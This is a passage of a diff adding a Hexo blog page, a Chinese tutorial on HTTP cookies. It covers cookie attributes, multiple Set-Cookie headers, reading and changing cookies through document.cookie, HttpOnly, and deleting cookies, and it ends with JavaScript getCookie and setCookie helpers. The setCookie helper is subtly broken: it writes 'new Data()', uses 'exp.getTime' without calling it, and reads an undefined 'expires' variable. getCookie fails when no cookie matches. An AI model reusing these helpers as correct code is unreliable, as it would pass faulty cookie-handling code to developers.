+<td>cookie 存活的时间，单位是秒。</td>
+<td>优先级比 Expires 高</td>
+</tr>
+<tr>
+<td>Domain</td>
+<td>cookie 可以送达的主机名</td>
+<td>假如没有指定，那么默认值为当前文档访问地址中的主机部分（但是不包含子域名）</td>
+</tr>
+<tr>
+<td>Path</td>
+<td>指定一个 URL 路径，这个路径必须出现在要请求的资源的路径中才可以发送 Cookie 首部</td>
+<td>字符  %x2F (“/“) 可以解释为文件目录分隔符，此目录的下级目录也满足匹配的条件（例如，如果 path=/docs，那么 “/docs”, “/docs/Web/“ 或者 “/docs/Web/HTTP” 都满足匹配的条件）。如果没有设置这个值，用户代理会默认使用 HTTP 请求 URI 的 path</td>
+</tr>
+<tr>
+<td>Secure</td>
+<td>只有在浏览器认为当前通道是“安全”的，才会把带有 Secure 选项的 cookie 发送到服务端</td>
+<td>浏览器认为的安全，通常是在 HTTPS 下</td>
+</tr>
+<tr>
+<td>HttpOnly</td>
+<td>设置了 HttpOnly 属性的 cookie 不能使用 JavaScript 经由  Document.cookie 属性、XMLHttpRequest 和  Request APIs 进行访问，以防范跨站脚本攻击（XSS）</td>
+</tr>
+</tbody>
+</table>
+<p>一个 Set-Cookie 首部字段，只能设置一个 cookie，如果要设置多个 cookie ，直接用多个 Set-Cookie 字段。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:&lt;cookie1&gt;</span><br><span class="line">Set-Cookie:&lt;cookie2&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="cookie的读写"><a href="#cookie的读写" class="headerlink" title="cookie的读写"></a>cookie的读写</h3><p>原生 node 的 res.setHeader 和 res.writeHead ，如果直接对 Set-Cookie 赋值，会出现覆盖的情况。其实也好理解，对对象的某个属性重复写入值，只有最后一个会保留。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.setHeader(<span class="string">"Set-Cookie"</span>, <span class="string">"yang=ozz; Max-Age=500"</span>);</span><br></pre></td></tr></table></figure>
+<p>要在 HTTP 头部加入多个 Set-Cookie 字段，需要对响应流拼接多个 Set-Cookie 选项。为了节省时间，这里用 express 。</p>
+<p>设置以下 cookie</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: yan=eee; Max-Age=600; Path=/; Expires=Invalid Date</span><br><span class="line">Set-Cookie: agg=sss; Max-Age=600; Path=/; Expires=Invalid Date</span><br></pre></td></tr></table></figure>
+<p>通过 document.cookie 或直接在浏览器 Application 面板中，可以直接访问，修改 cookie 。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.cookie // &quot;yan=eee; agg=sss&quot;</span><br><span class="line">document.cookie = &quot;yan=www&quot;;</span><br><span class="line">document.cookie // &quot;agg=sss; yan=www&quot;</span><br></pre></td></tr></table></figure>
+<p>document.cookie 修改 cookie 只能一个个修改，格式和 Set-Cookie 一样。没有指定修改的属性保持不变，修改的值便覆盖原来的值。</p>
+<h4 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h4><p>HttpOnly 只能由服务端设置，本地的设置不会生效。而且设置了 HTTPOnly 的 cookie 无法通过 document.cookie 访问。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: yan=eee; Max-Age=600; Path=/; Expires=Invalid Date; HttpOnly</span><br><span class="line">Set-Cookie: agg=sss; Max-Age=600; Path=/; Expires=Invalid Date</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie // &quot;agg=sss&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="cookie-删改"><a href="#cookie-删改" class="headerlink" title="cookie 删改"></a>cookie 删改</h3><p>修改 cookie</p>
+<p>要想修改一个cookie，只需要重新赋值就行，旧的值会被新的值覆盖。但要注意一点，在设置新cookie时，path/domain这几个选项一定要旧cookie 保持一样。否则不会修改旧值，而是添加了一个新的 cookie。</p>
+<p>删除 cookie</p>
+<p>删除一个cookie 也挺简单，也是重新赋值，只要将这个新cookie的expires 选项设置为一个过去的时间点就行了。但同样要注意，path/domain/这几个选项一定要旧cookie 保持一样。</p>
+<p>原生的 cookie 的读写接口都不太友好，一般需要封装方法。</p>
+<ul>
+<li>读取 cookie</li>
+</ul>
+<p>document.cookie 的结果是一串字符串，是以“; ”分隔开的 cookie 键值对。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ary = <span class="built_in">document</span>.cookie.match(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(^| )"</span> + name + <span class="string">"=([^;]*)(;|$)"</span>));</span><br><span class="line">    <span class="comment">// 第二个捕获组就是 key=value; 的 value</span></span><br><span class="line">    <span class="keyword">return</span> ary[<span class="number">2</span>] ? ary[<span class="number">2</span>] : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getCookie(<span class="string">'agg'</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// options</span></span><br><span class="line"><span class="comment">// |-- expires  自设置起过期秒数</span></span><br><span class="line"><span class="comment">// |-- callback 设置成功后回调</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">name, value, options</span>) </span>&#123;</span><br><span class="line">    options = options ? options : &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> exp = <span class="keyword">new</span> Data();</span><br><span class="line">    <span class="keyword">var</span> expire = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (options.expires) &#123;</span><br><span class="line">        exp.setTime(exp.getTime + expires * <span class="number">1000</span>);</span><br><span class="line">        expire = exp.toGMTString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.cookie = name + <span class="string">"="</span> + <span class="built_in">escape</span>(value) + <span class="string">";path=/;expires="</span> + expire;</span><br><span class="line">    options.callback &amp;&amp; options.callback();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://www.xqyoung.com/2018/11/20/cookie-base-concept/" data-id="ckbs697pe0007rhjci65x2x03" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/客户端储存/">客户端储存</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络/">网络</a></li></ul>
+
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+    </article>
+    
+  
+    
+      <nav class="page-nav">
+        <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next</a>
+      </nav>
+    
+  </section>
+</div>
+
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-bar-chart"></i> <span id="busuanzi_value_site_pv"></span></li>
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 xqyoung&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="xqyoung&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+<script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/lazyload.min.js"></script>
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+  <script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/ocean.js"></script>
+
+</body>
+</html>
